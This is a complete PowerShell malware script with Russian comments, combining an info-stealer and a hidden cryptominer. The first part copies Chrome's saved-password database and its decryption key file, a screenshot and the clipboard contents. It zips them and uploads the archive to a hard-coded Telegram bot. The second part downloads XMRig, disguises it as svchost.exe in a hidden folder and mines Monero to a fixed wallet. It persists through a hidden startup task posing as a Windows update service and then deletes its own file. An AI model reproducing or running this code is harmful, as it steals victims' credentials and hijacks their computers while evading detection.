[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==================== НАСТРОЙКИ TELEGRAM ====================
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# ==================== СТИЛЕР (сбор данных) ====================
$workDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    # Chrome пароли
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
    if (Test-Path $loginData) {
        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $out = [System.IO.File]::Create("$workDir\passwords.db")
        $stream.CopyTo($out); $stream.Close(); $out.Close()
    }

    # Скриншот
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $bmp.Save("$workDir\screen.png")
    $g.Dispose(); $bmp.Dispose()

    # Буфер обмена
    "Clipboard Content: $((Get-Clipboard) -join ' ')" | Out-File "$workDir\info.txt"

    # Упаковка и отправка
    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)
    & curl.exe -s -F "chat_id=$chatId" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"

} catch {
    $err = $_.Exception.Message
    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
} finally {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}

# ==================== СКРЫТЫЙ МАЙНЕР (Monero) ====================
# Настройки майнера
$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$wallet = "44hEzgDamuSMLdWLUVkmJpJvTLeWjjc2LhUqa898N9eaXFm4QqJuTBR5HfKE8j954SReNHhZHW7NW5gdbWdQuVjg8maA4vz"
$pool = "pool.supportxmr.com:3333"

# Папка для майнера (скрытая системная)
$minerDir = "$env:APPDATA\Microsoft\Windows\Crypto"
New-Item -ItemType Directory -Path $minerDir -Force -ErrorAction SilentlyContinue | Out-Null
attrib +h $minerDir  # скрыть папку

# Скачиваем и распаковываем XMRig
$minerZip = "$env:TEMP\xmrig.zip"
Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip -UseBasicParsing
Expand-Archive -Path $minerZip -DestinationPath "$env:TEMP\xmrig" -Force

# Переименовываем xmrig.exe в svchost.exe (системный процесс)
Copy-Item "$env:TEMP\xmrig\xmrig-6.22.2\xmrig.exe" -Destination "$minerDir\svchost.exe" -Force

# Конфиг для скрытого майнинга (50% CPU, низкий приоритет, фон)
$config = @"
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50,
        "priority": 1,
        "asm": true
    },
    "pools": [
        {
            "url": "$pool",
            "user": "$wallet",
            "pass": "x",
            "tls": false,
            "keepalive": true
        }
    ],
    "background": true,
    "title": false,
    "print-time": 0,
    "http": {
        "enabled": false
    }
}
"@
$config | Out-File -FilePath "$minerDir\config.json" -Encoding ASCII

# Создаём задачу в планировщике (автозапуск при старте, скрыто)
$taskName = "WindowsUpdateService"
$action = New-ScheduledTaskAction -Execute "$minerDir\svchost.exe" -Argument "--config=$minerDir\config.json"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force

# Запускаем майнер прямо сейчас (скрыто)
Start-Process -FilePath "$minerDir\svchost.exe" -ArgumentList "--config=$minerDir\config.json" -WindowStyle Hidden

# Чистим временные файлы
Remove-Item $minerZip -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\xmrig" -Recurse -Force -ErrorAction SilentlyContinue

# Небольшая задержка, чтобы не спалить себя (опционально)
Start-Sleep -Seconds 2

# Самоуничтожение этого скрипта (если запускался из временного файла)
if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}
